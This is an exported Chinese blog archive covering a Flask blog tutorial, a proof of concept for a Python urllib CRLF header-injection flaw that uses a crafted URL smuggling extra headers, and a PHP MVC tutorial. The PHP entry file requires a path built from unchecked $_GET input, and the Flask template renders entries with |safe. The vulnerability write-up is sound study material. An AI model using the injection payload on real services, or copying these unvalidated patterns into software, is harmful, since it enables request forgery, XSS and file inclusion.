class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">stylesheet</span> <span class="attr">type</span>=<span class="string">text/css</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('static', filename='style.css') &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">metanav</span>&gt;</span></span><br><span class="line">  &amp;#123;% if not session.logged_in %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span>&gt;</span>log in<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  &amp;#123;% else %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('logout') &amp;#125;&amp;#125;"</span>&gt;</span>log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &amp;#123;% for message in get_flashed_messages() %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span>&amp;#123;&amp;#123; message &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &amp;#123;% endfor %&amp;#125;</span><br><span class="line">  &amp;#123;% block body %&amp;#125;&amp;#123;% endblock %&amp;#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="show-entries-html"><a href="#show-entries-html" class="headerlink" title="show_entries.html"></a>show_entries.html</h3><p>这个模板继承了上面的layout.html模板用来显示信息。注意for遍历了所有我们用render_template()函数传入的信息。我们同样告诉表单提交到add_entry函数通过使用 HTTP 的POST方法。</p><p>在 flaskr/templates 目录下新建 show_entries.html 文件并写入如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "layout.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  &amp;#123;% if session.logged_in %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('add_entry') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">class</span>=<span class="string">add-entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Title:</span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">size</span>=<span class="string">30</span> <span class="attr">name</span>=<span class="string">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Text:</span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">text</span> <span class="attr">rows</span>=<span class="string">5</span> <span class="attr">cols</span>=<span class="string">40</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Share</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">entries</span>&gt;</span></span><br><span class="line">  &amp;#123;% for entry in entries %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&amp;#123;&amp;#123; entry.title &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>&amp;#123;&amp;#123; entry.text|safe &amp;#125;&amp;#125;</span><br><span class="line">  &amp;#123;% else %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Unbelievable.  No entries here so far<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">  &amp;#123;% endfor %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><h3 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h3><p>最后是登录模板，基本上只显示一个允许用户登录的表单。</p><p>在 flaskr/templates 目录下新建 login.html 文件并写入如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "layout.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &amp;#123;% if error %&amp;#125;<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &amp;#123;&amp;#123; error &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><h3 id="添加样式"><a href="#添加样式" class="headerlink" title="添加样式"></a>添加样式</h3><p>现在其它一切都正常工作，是时候给应用添加些样式。</p><p>在 Code/flaskr/static 目录下新建 style.css 样式文件并写入如下代码：<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>            &amp;<span class="selector-id">#123</span>; <span class="attribute">font-family</span>: sans-serif; <span class="attribute">background</span>: <span class="number">#eee</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>       &amp;<span class="selector-id">#123</span>; <span class="attribute">color</span>: <span class="number">#377BA8</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">font-family</span>: <span class="string">'Georgia'</span>, serif; <span class="attribute">margin</span>: <span class="number">0</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h1</span>              &amp;<span class="selector-id">#123</span>; <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#eee</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-tag">h2</span>              &amp;<span class="selector-id">#123</span>; <span class="attribute">font-size</span>: <span class="number">1.2em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.page</span>           &amp;<span class="selector-id">#123</span>; <span class="attribute">margin</span>: <span class="number">2em</span> auto; <span class="attribute">width</span>: <span class="number">35em</span>; <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">                  <span class="attribute">padding</span>: <span class="number">0.8em</span>; <span class="attribute">background</span>: white; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span>        &amp;<span class="selector-id">#123</span>; <span class="attribute">list-style</span>: none; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">0</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span>     &amp;<span class="selector-id">#123</span>; <span class="attribute">margin</span>: <span class="number">0.8em</span> <span class="number">1.2em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.entries</span> <span class="selector-tag">li</span> <span class="selector-tag">h2</span>  &amp;<span class="selector-id">#123</span>; <span class="attribute">margin-left</span>: -<span class="number">1em</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.add-entry</span>      &amp;<span class="selector-id">#123</span>; <span class="attribute">font-size</span>: <span class="number">0.9em</span>; <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.add-entry</span> <span class="selector-tag">dl</span>   &amp;<span class="selector-id">#123</span>; <span class="attribute">font-weight</span>: bold; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.metanav</span>        &amp;<span class="selector-id">#123</span>; <span class="attribute">text-align</span>: right; <span class="attribute">font-size</span>: <span class="number">0.8em</span>; <span class="attribute">padding</span>: <span class="number">0.3em</span>;</span><br><span class="line">                  <span class="attribute">margin-bottom</span>: <span class="number">1em</span>; <span class="attribute">background</span>: <span class="number">#fafafa</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.flash</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">background</span>: <span class="number">#CEE5F5</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>;</span><br><span class="line">                  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#AACBE2</span>; &amp;<span class="selector-id">#125</span>;</span><br><span class="line"><span class="selector-class">.error</span>          &amp;<span class="selector-id">#123</span>; <span class="attribute">background</span>: <span class="number">#F0D6D6</span>; <span class="attribute">padding</span>: <span class="number">0.5em</span>; &amp;<span class="selector-id">#125</span>;</span><br></pre></td></tr></table></figure></p><h2 id="运行应用"><a href="#运行应用" class="headerlink" title="运行应用"></a>运行应用</h2><p>这样我们就完成了简单博客应用的代码编写，现在在终端执行如下命令运行程序：（在这之前注意要配置数据库，如果没有配置可以参考上一个实验的步骤）<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> flaskr.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></p><p>访问首页 <a href="http://127.0.0.1:5000" target="_blank" rel="noopener">http://127.0.0.1:5000</a> ，效果如下：</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1d1eyb1a4j30sn09kgmk.jpg" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python urllib HTTP头注入漏洞</title>
      <link href="/2019/03/22/Python-urllib-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/22/Python-urllib-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>Python的urllib库（在Python2中为 urllib2 ，在Python3中为 urllib ）有一个HTTP协议下的协议流注入漏洞。如果攻击者可以控制Python代码访问任意URL或者让Python代码访问一个恶意的web servr，那这个漏洞可能会危害内网服务安全。<br>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。<br>注:现在的python版本已经修复了<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!python</span></span><br><span class="line"><span class="meta">#!/usr/bin/env python3  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request   </span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure></p><p>这段代码只是从命令行参数接收一个URL，然后去访问它。为了查看 urllib 获取的HTTP头，我们用一个nc来监听端口。<br>在命令行输入<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -<span class="selector-tag">p</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure></p><p>重新打开一个窗口运行py文件<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch3<span class="selector-class">.py</span> http:<span class="comment">//127.0.0.1:12345/style</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bi52sbu3j30qk07cmxh.jpg" alt=""></p><p>可以看到,在server得到了http请求头<br>然后我们使用恶意构造的地址<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch<span class="number">3</span>.py http://<span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">%0</span>d<span class="symbol">%0</span>aX-injected:<span class="symbol">%20</span>header<span class="symbol">%0</span>d<span class="symbol">%0</span>ax-leftover:<span class="symbol">%20</span>:<span class="number">12345</span>/foo</span><br></pre></td></tr></table></figure></p><p>返回的HTTP头就是<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line"><span class="builtin-name">GET</span> /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p><h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><h2 id="HTTP头注入和请求伪造"><a href="#HTTP头注入和请求伪造" class="headerlink" title="HTTP头注入和请求伪造"></a>HTTP头注入和请求伪造</h2><h2 id="攻击memcached"><a href="#攻击memcached" class="headerlink" title="攻击memcached"></a>攻击memcached</h2><h2 id="攻击Redis"><a href="#攻击Redis" class="headerlink" title="攻击Redis"></a>攻击Redis</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">https://strcpy.me/index.php/archives/749/</a><br><a href="http://www.anquan.us/static/drops/papers-16905.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-16905.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/106</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP MVC开发框架学习</title>
      <link href="/2019/03/21/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/21/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过学习MVC能够更深的了解一些mvc框架</p><h1 id="MVC-思想"><a href="#MVC-思想" class="headerlink" title="MVC 思想"></a>MVC 思想</h1><p>MVC是一个设计模式，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型（M）、视图（V）、控制器（C），它们各自处理自己的任务。</p><p>视图：视图是用户看到并与之交互的界面。对老式的Web应用程序来说，视图就是由HTML元素组成的界面，在新式的Web应用程序中，HTML依旧在视图中扮演着重要的角色，但一些新的技术已层出不穷，它们包括Adobe Flash和象XHTML，XML/XSL，WML等一些标识语言和Web services。如何处理应用程序的界面变得越来越有挑战性。MVC一个大的好处是它能为你的应用程序处理很多不同的视图。在视图中其实没有真正的处理发生，不管这些数据是联机存储的还是一个雇员列表，作为视图来讲，它只是作为一种输出数据并允许用户操纵的方式。</p><p>模型：模型表示企业数据和业务规则。在MVC的三个部件中，模型拥有最多的处理任务。例如它可能用象EJBs和ColdFusion Components这样的构件对象来处理数据库。被模型返回的数据是中立的，就是说模型与数据格式无关，这样一个模型能为多个视图提供数据。由于应用于模型的代码只需写一次就可以被多个视图重用，所以减少了代码的重复性。</p><p>控制器：控制器接受用户的输入并调用模型和视图去完成用户的需求。所以当单击Web页面中的超链接和发送HTML表单时，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后确定用哪个视图来显示模型处理返回的数据。</p><h1 id="单一入口"><a href="#单一入口" class="headerlink" title="单一入口"></a>单一入口</h1><p>单一入口通常是指一个项目或者应用具有一个统一（但并不一定是唯一）的入口文件，也就是说项目的所有功能操作都是通过这个入口文件进行的，并且往往入口文件是第一步被执行的。</p><p>单一入口的好处是项目整体比较规范，因为同一个入口，往往其不同操作之间具有相同的规则。另外一个方面就是单一入口带来的好处是控制较为灵活，因为拦截方便了，类似如一些权限控制、用户登录方面的判断和操作可以统一处理了。</p><p>或者有些人会担心所有网站都通过一个入口文件进行访问，是否会造成太大的压力，其实这是杞人忧天的想法。</p><p>现在我们总结MVC的处理过程，首先控制器接收用户的请求，并决定应该调用哪个模型来进行处理，然后模型用业务逻辑来处理用户的请求并返回数据，最后控制器用相应的视图格式化模型返回的数据，并通过表示层呈现给用户。</p><p>一个典型的Web MVC流程：</p><p>Controller截获用户发出的请求；<br>Controller调用Model完成状态的读写操作；<br>Controller把数据传递给View；<br>View渲染最终结果并呈献给用户。</p><h1 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h1><p>MySQL的表名需小写或小写加下划线，如：item，car_orders。<br>模块名（Models）需用大驼峰命名法，即首字母大写，并在名称后添加Model，如：ItemModel，CarModel。<br>控制器（Controllers）需用大驼峰命名法，即首字母大写，并在名称后添加Controller，如：ItemController，CarController。<br>方法名（Action）需用小驼峰命名法，即首字母小写，如：index，indexPost。<br>视图（Views）部署结构为控制器名/行为名，如：item/view.php，car/buy.php。</p><p>对于只有 PHP 代码的文件，最好没有结束标志?&gt;，<br>PHP自身并不需要结束符号，不加结束符让程序更加安全，很大程度防止了末尾被注入额外的内容。</p><p>请求URL<br>ocalhost/index.php?c=demo&amp;a=index¶m=welcome</p><p>如果想得到更加优美的URL结构，可以进行优化，为由这URL结构优化与本文关系不大，以后进行分享。</p><p>从上面的参数可以看出，访问的文件是index.php，同时含有3个参数分别为c、a、param。</p><h1 id="MVC实现"><a href="#MVC实现" class="headerlink" title="MVC实现"></a>MVC实现</h1><p>首先来实现一个简单的MVC<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">├─www                       <span class="meta"># 网站根目录</span></span><br><span class="line">│  ├─controller             <span class="meta"># 控制器目录</span></span><br><span class="line">│  │  ├─democontroller.php  <span class="meta"># demo控制器</span></span><br><span class="line">│  ├─model                  <span class="meta"># 模型目录</span></span><br><span class="line">│  │  ├─model.php           <span class="meta"># model模型</span></span><br><span class="line">│  ├─view                   <span class="meta"># 视图目录</span></span><br><span class="line">│  │  ├─<span class="keyword">index</span>.php           <span class="meta"># index视图</span></span><br><span class="line">│  ├─<span class="keyword">index</span>.php              <span class="meta"># 入口文件</span></span><br></pre></td></tr></table></figure></p><p>/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">'controller/democontroller.php'</span>);</span></span><br><span class="line"><span class="php">$controller = <span class="keyword">new</span> DemoController();</span></span><br><span class="line"><span class="php">$controller-&gt;index();</span></span><br></pre></td></tr></table></figure></p><p>controller/democontroller.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>访问127.0.0.1/index.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1ablxog3cj30au03emx5.jpg" alt=""><br>如果使用下面的URL进行访问，可以预见不会有任何输出。<br>访问<a href="http://localhost/controller/democontroller.php" target="_blank" rel="noopener">http://localhost/controller/democontroller.php</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1abmuc7nfj30dp064wek.jpg" alt=""><br>只能通过index.php来访问，这也是为什么称它为入口文件的原因<br>现在来通过参数来调用不同的控制器<br>接下来改写index.php内容<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $c_str = $_GET[<span class="string">'c'</span>];  <span class="comment">// 获取控制器</span></span></span><br><span class="line"><span class="php"> $c_name = $c_str.<span class="string">'controller'</span>;</span></span><br><span class="line"><span class="php"> $c_path = <span class="string">'controller/'</span>.$c_name.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $method = $_GET[<span class="string">'a'</span>]; <span class="comment">//方法名</span></span></span><br><span class="line"><span class="php"> <span class="keyword">require</span>($c_path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $controller = <span class="keyword">new</span> $c_name;</span></span><br><span class="line"><span class="php"> $controller-&gt;$method();</span></span><br></pre></td></tr></table></figure></p><p>访问<br><a href="http://localhost/index.php?c=demo&amp;a=index" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index</a><br>同样能够得到内容</p><p>接下来加入view,使用视图对象处理输出<br>view/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($output)</span> </span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">         <span class="keyword">echo</span> $output;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php"> &#125;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// controller/democontroller.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    $data = <span class="string">'Hello furzoom!'</span>;</span></span><br><span class="line"><span class="php">    <span class="comment">//echo 'hello world';</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'view/index.php'</span>);</span></span><br><span class="line"><span class="php">    $view = <span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    $view-&gt;display($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p> 访问 <a href="http://localhost/index.php?c=demo&amp;a=index" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index</a><br> <img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1acj5f1k6j30bn02zdfv.jpg" alt=""></p><p> 